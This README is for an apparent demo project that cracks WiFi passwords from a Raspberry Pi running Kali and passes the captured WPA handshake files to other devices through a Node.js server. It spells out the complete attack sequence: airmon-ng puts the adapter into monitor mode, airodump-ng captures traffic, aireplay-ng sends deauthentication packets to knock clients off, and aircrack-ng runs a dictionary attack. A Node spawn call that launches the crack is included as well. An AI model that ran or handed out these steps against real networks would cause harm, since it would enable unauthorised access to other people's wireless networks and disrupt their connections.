# Install Help

after clone:

`npm install`

run both on IoT_device and main device which use to detect WIFI:

`npm start`

---

In main device which used to detect WIFI, it should have wlan1 in monitor mode. wlan1 is the external WIFI adaptor in most of case. wlan0 is the on-board WIFI adaptor

* you may get some problem when you are trying to put your external WIFI adaptor into monitor mode

  here is how I solved:

  ```root# airmon-ng start wlan1
  root# airmon-ng start wlan1
  // it may ask you airmon-ng check kill
  // do it in anyway because NetworkManager // is not working very well with aircrack
  
  root# airmon-ng check kill
  
  // then turn do airmon-ng start wlan1 again to make sure wlan is in monitor mode
  root# airmon-ng start wlan1
  
  // then restrat NetworkManager
  root# service NetworkManager restart
  
  // use iwconfig to check wlan1 is in 
  // monitor mode
  root# iwconfig
  ```


---

Before running the server on the main server that used to detect WIFI, run following steps make sure the device can do WIFI crack.



for example: in my raspi with kali Linux, you should have external WIFI adapter named wlan1, and then do the following steps to test if aircrack-ng work

```
root# airmon-ng start wlan1 // start wlan into monitor mode

root# airodump-ng wlan1 
// search wifi in moitor and remember WIFI bssid and channel you want to crack

root# airodump-ng wlan1 --bssid xxxxx -c xx -w wificrack
// make a connection from device to WIFI router get packet that captures raw 802.11 frames 

!!!!!!!open another terminal!!!!!!!

root# aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX(bssid) wlan1
// There are different attacks which can cause deauthentications for the purpose of capturing WPA handshake data, fake authentications.

root# aircrack-ng XXX(cap file) -w (wordlist file)
// crack the WIFI password
```



## IP config:

**IP address set during cap send out to IoT devices**

In routes/index.js file

```nodejs
function sendFile(back) {
  .
  .
  .
  .
  var filename = 'wificrack.cap';
  var target = '***your iot_device_ipaddress***' + path.basename(filename);
  var rs = fs.createReadStream(filename);
  .
  .

  make as many file sendout posts request as you like
  .
  .
  .
  .

  });
```

---

## Another Things:

* in this project is only to show the demo of our concepts, **I manually set the fixed WIFI's BSSID that used to be receiving the 4-handshake file**.

  ```
  you can change by here and make it dynamic or make it to your setting:
  /routes/index.js
  function runattack(back) {
  .
  .
  .
    var key = "";
    // if you want to use it in a anywhere or in your environment you should change here
    // for your purpose you should set up a http request includes the bssid.
    // but for demo, i don't need so much customization
    var cmd = spawn('aircrack-ng', ['-b', '**the bssid of WIFI**', '-q', '-w', './routes/password.txt', './routes/wificrack.cap'], {shell: true});
  .
  .
  .
  
  ```

* Because I am limited by resource, the only alive IoT device is my computer and **I manually set it to be alive and will be always one**, for your setup.